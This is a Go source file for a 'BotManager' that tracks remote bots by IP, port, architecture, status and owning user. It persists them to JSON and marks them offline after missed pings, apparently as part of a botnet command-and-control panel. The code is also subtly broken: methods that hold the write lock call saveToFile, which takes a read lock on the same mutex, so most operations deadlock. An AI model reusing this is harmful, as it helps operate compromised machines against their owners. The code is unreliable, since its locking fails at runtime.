package main

import (
	"encoding/json"
	"fmt"
	"os"
	"sync"
	"time"
)

type Bot struct {
	ID        string    `json:"id"`
	IP        string    `json:"ip"`
	Port      int       `json:"port"`
	Arch      string    `json:"arch"`
	Connected time.Time `json:"connected"`
	LastPing  time.Time `json:"last_ping"`
	Status    string    `json:"status"`
	Username  string    `json:"username"`
}

type BotManager struct {
	Bots     map[string]*Bot
	Mutex    sync.RWMutex
	Filename string
}

var botManager = &BotManager{
	Bots:     make(map[string]*Bot),
	Filename: "data/bots.json",
}

func (bm *BotManager) Load() error {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	file, err := os.ReadFile(bm.Filename)
	if err != nil {
		if os.IsNotExist(err) {
			bm.saveToFile()
			return nil
		}
		return err
	}

	var bots []*Bot
	if err := json.Unmarshal(file, &bots); err != nil {
		return err
	}

	bm.Bots = make(map[string]*Bot)
	for _, bot := range bots {
		bm.Bots[bot.ID] = bot
	}

	return nil
}

func (bm *BotManager) saveToFile() error {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	var bots []*Bot
	for _, bot := range bm.Bots {
		bots = append(bots, bot)
	}

	data, err := json.MarshalIndent(bots, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(bm.Filename, data, 0644)
}

func (bm *BotManager) Add(ip string, port int, arch string, username string) string {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	id := fmt.Sprintf("%s:%d", ip, port)

	if bot, exists := bm.Bots[id]; exists {
		bot.LastPing = time.Now()
		bot.Status = "online"
		bm.saveToFile()
		return id
	}

	bot := &Bot{
		ID:        id,
		IP:        ip,
		Port:      port,
		Arch:      arch,
		Connected: time.Now(),
		LastPing:  time.Now(),
		Status:    "online",
		Username:  username,
	}

	bm.Bots[id] = bot
	bm.saveToFile()
	return id
}

func (bm *BotManager) Remove(id string) {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	delete(bm.Bots, id)
	bm.saveToFile()
}

func (bm *BotManager) Get(id string) *Bot {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	return bm.Bots[id]
}

func (bm *BotManager) GetAll() []*Bot {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	var bots []*Bot
	for _, bot := range bm.Bots {
		bots = append(bots, bot)
	}
	return bots
}

func (bm *BotManager) GetCount() int {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	return len(bm.Bots)
}

func (bm *BotManager) GetArchCounts() map[string]int {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	counts := make(map[string]int)
	for _, bot := range bm.Bots {
		counts[bot.Arch]++
	}
	return counts
}

func (bm *BotManager) UpdateStatus(id string, status string) {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	if bot, exists := bm.Bots[id]; exists {
		bot.Status = status
		bot.LastPing = time.Now()
		bm.saveToFile()
	}
}

func (bm *BotManager) Ping(id string) {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	if bot, exists := bm.Bots[id]; exists {
		bot.LastPing = time.Now()
		if bot.Status == "offline" {
			bot.Status = "online"
		}
		bm.saveToFile()
	}
}

func (bm *BotManager) CheckOffline() {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	now := time.Now()
	for _, bot := range bm.Bots {
		if now.Sub(bot.LastPing) > 30*time.Second {
			bot.Status = "offline"
		}
	}
	bm.saveToFile()
}

func (bm *BotManager) StartOfflineChecker() {
	ticker := time.NewTicker(10 * time.Second)
	go func() {
		for range ticker.C {
			bm.CheckOffline()
		}
	}()
}

func (bm *BotManager) GetByUser(username string) []*Bot {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	var bots []*Bot
	for _, bot := range bm.Bots {
		if bot.Username == username {
			bots = append(bots, bot)
		}
	}
	return bots
}